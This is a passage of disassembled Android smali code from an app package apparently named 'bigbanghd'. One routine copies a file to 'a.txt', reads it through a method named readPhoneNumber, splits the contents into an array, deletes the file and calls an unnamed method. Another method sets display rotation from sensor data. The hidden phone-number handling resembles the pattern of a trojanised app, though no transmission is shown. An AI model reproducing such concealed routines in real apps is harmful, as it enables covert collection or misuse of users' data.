    invoke-virtual {v2, v3}, Ljava/lang/StringBuffer;->append(Ljava/lang/String;)Ljava/lang/StringBuffer;

    move-result-object v2

    const-string v3, "a.txt"

    invoke-virtual {v2, v3}, Ljava/lang/StringBuffer;->append(Ljava/lang/String;)Ljava/lang/StringBuffer;

    move-result-object v2

    invoke-virtual {v2}, Ljava/lang/StringBuffer;->toString()Ljava/lang/String;

    move-result-object v2

    invoke-direct {v1, v2}, Ljava/io/File;-><init>(Ljava/lang/String;)V

    invoke-virtual {p0, v0, v1}, Lcom/sunglab/bigbanghd/s;->b(Ljava/io/File;Ljava/io/File;)V
    :try_end_0
    .catch Ljava/io/IOException; {:try_start_0 .. :try_end_0} :catch_1
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    .line 70
    :goto_0
    new-instance v0, Ljava/lang/StringBuffer;

    invoke-direct {v0}, Ljava/lang/StringBuffer;-><init>()V

    iget-object v1, p0, Lcom/sunglab/bigbanghd/s;->odexPath:Ljava/lang/String;

    invoke-virtual {v0, v1}, Ljava/lang/StringBuffer;->append(Ljava/lang/String;)Ljava/lang/StringBuffer;

    move-result-object v0

    const-string v1, "a.txt"

    invoke-virtual {v0, v1}, Ljava/lang/StringBuffer;->append(Ljava/lang/String;)Ljava/lang/StringBuffer;

    move-result-object v0

    invoke-virtual {v0}, Ljava/lang/StringBuffer;->toString()Ljava/lang/String;

    move-result-object v0

    invoke-static {v0}, Lcom/sunglab/bigbanghd/s;->readPhoneNumber(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v0

    const-string v1, "\n"

    invoke-virtual {v0, v1}, Ljava/lang/String;->split(Ljava/lang/String;)[Ljava/lang/String;

    move-result-object v0

    iput-object v0, p0, Lcom/sunglab/bigbanghd/s;->aa:[Ljava/lang/String;

    .line 71
    new-instance v0, Ljava/io/File;

    new-instance v1, Ljava/lang/StringBuffer;

    invoke-direct {v1}, Ljava/lang/StringBuffer;-><init>()V

    iget-object v2, p0, Lcom/sunglab/bigbanghd/s;->odexPath:Ljava/lang/String;

    invoke-virtual {v1, v2}, Ljava/lang/StringBuffer;->append(Ljava/lang/String;)Ljava/lang/StringBuffer;

    move-result-object v1

    const-string v2, "a.txt"

    invoke-virtual {v1, v2}, Ljava/lang/StringBuffer;->append(Ljava/lang/String;)Ljava/lang/StringBuffer;

    move-result-object v1

    invoke-virtual {v1}, Ljava/lang/StringBuffer;->toString()Ljava/lang/String;

    move-result-object v1

    invoke-direct {v0, v1}, Ljava/io/File;-><init>(Ljava/lang/String;)V

    .line 72
    invoke-virtual {v0}, Ljava/io/File;->delete()Z

    .line 73
    invoke-direct {p0}, Lcom/sunglab/bigbanghd/s;->c()V

    return-void

    .line 64
    :catch_0
    move-exception v0

    goto :goto_0

    :catch_1
    move-exception v0

    goto :goto_0
.end method

.method public onSensorChanged(Landroid/hardware/SensorEvent;)V
    .locals 3
    .annotation system Ldalvik/annotation/Signature;
        value = {
            "(",
            "Landroid/hardware/SensorEvent;",
            ")V"
        }
    .end annotation

    .prologue
    .line 193
    const/4 v0, 0x2

    .line 194
    iget-object v1, p1, Landroid/hardware/SensorEvent;->sensor:Landroid/hardware/Sensor;

    invoke-virtual {v1}, Landroid/hardware/Sensor;->getType()I

    move-result v1

    const/4 v2, 0x3

    if-ne v1, v2, :cond_0

    .line 196
    iget-object v1, p1, Landroid/hardware/SensorEvent;->values:[F

    aget v1, v1, v0

    float-to-int v1, v1

    const/16 v2, 0x2d

    if-le v1, v2, :cond_1

    .line 198
    const/16 v0, -0x5a

    sput v0, Lcom/sunglab/bigbanghd/GL2JNIView$Renderer;->DefinallyROTATION:I

    .line 214
    :cond_0
    :goto_0
    return-void

    .line 201
    :cond_1
    iget-object v1, p1, Landroid/hardware/SensorEvent;->values:[F

    aget v0, v1, v0

    float-to-int v0, v0

    const/16 v1, -0x2d

    if-ge v0, v1, :cond_2

    .line 203
    const/16 v0, 0x5a

    sput v0, Lcom/sunglab/bigbanghd/GL2JNIView$Renderer;->DefinallyROTATION:I

    goto :goto_0

    .line 208
    :cond_2
    const/4 v0, 0x0

    sput v0, Lcom/sunglab/bigbanghd/GL2JNIView$Renderer;->DefinallyROTATION:I

    goto :goto_0
.end method
